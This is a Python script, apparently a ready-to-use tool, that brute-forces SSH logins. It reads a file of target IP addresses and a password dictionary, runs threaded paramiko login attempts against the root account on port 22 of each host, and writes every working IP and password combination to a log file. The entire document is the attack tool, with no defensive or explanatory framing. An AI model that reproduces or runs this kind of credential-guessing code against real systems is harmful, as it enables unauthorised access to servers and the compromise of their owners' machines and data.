#查看使用方式：python ssh.scan.py -h
#!/usr/bin/python python
# -*- coding: utf-8 -*-
import paramiko,threading,sys,time,os

class SSHThread(threading.Thread):
    def __init__(self, ip, port, timeout, dic, LogFile):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.dict = dic
        self.timeout = timeout
        self.LogFile = LogFile
    def run(self):
        print("Start try ssh => %s" % self.ip)
        username = "root"
        try:
            password = open(self.dict).read().split('\n')
        except:
            print("Open dict file `%s` error" % self.dict)
            exit(1)
        for pwd in password:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.ip, self.port, username, pwd, timeout = self.timeout)
                print("\nIP => %s, Login %s => %s \n" % (self.ip, username, pwd))
                open(self.LogFile, "a").write("[ %s ] IP => %s, port => %d, %s => %s \n" % (time.asctime( time.localtime(time.time()) ), self.ip, self.port, username, pwd))
                break
            except:
                print("IP => %s, Error %s => %s" % (self.ip, username, pwd))
                pass
def ViolenceSSH(ip, port, timeout, dic, LogFile):
    ssh_scan = SSHThread(ip, port, timeout, dic, LogFile)
    ssh_scan.start()

def main(ipFile, dic, log):
    if ipFile == "-h":
        help()
    try:
        ipText = open(ipFile).read().split('\n')
        for ip in ipText:
            if ip != '':
                time.sleep(0.5)
                threading.Thread(target = ViolenceSSH, args = (ip, 22, 1, dic, log, )).start()
    except:
        print("Open IP list file `%s` error" % ipFile)
        exit(1)
def help():
    print("python ssh.scan.py 使用说明:\n\
        python ssh.scan.py ip_file_path dict_file_path ssh_log_path \n")
    exit(1)

if __name__ == '__main__':

    fpath = os.path.dirname(os.path.abspath('__file__'))
    ipFile = sys.argv[1] if len(sys.argv) > 1 else fpath+"/dict/ip" 
    dic = sys.argv[2] if len(sys.argv) > 2 else fpath+"/dict/password"
    log = sys.argv[3] if len(sys.argv) > 3 else fpath+"/log/sshd"
    try:
        os.system("clear")
        main(ipFile, dic, log)
    except KeyboardInterrupt:
        exit(1)
